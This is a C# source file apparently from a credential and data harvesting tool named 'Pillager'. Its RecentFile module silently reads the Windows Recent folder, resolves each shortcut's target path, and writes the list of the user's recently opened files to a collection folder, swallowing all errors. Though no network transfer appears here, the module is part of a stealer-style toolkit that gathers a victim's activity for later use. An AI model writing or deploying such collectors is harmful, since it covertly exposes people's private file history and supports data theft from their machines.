using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Pillager.Helper;

namespace Pillager.SystemInfos
{
    internal class RecentFile : ICommand
    {
        public string GetInfo()
        {
            StringBuilder sb = new StringBuilder(); string recent = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Recent");
            foreach (var file in Directory.GetFiles(recent, "*.lnk"))
            {
                try
                {
                    Shortcut.IWshShortcut shortcut = (Shortcut.IWshShortcut)Shortcut.m_type.InvokeMember("CreateShortcut", System.Reflection.BindingFlags.InvokeMethod, null, Shortcut.m_shell, new object[] { file });
                    if (!string.IsNullOrEmpty(shortcut.TargetPath)) sb.AppendLine(shortcut.TargetPath);
                }
                catch { }
            }

            return sb.ToString();
        }
        public override void Save(string path)
        {
            try
            {
                string savepath = Path.Combine(path, "System");
                string result = GetInfo();
                if (!string.IsNullOrEmpty(result))
                {
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "RecentFile.txt"), result, Encoding.UTF8);
                }
            }
            catch { }
        }
    }
}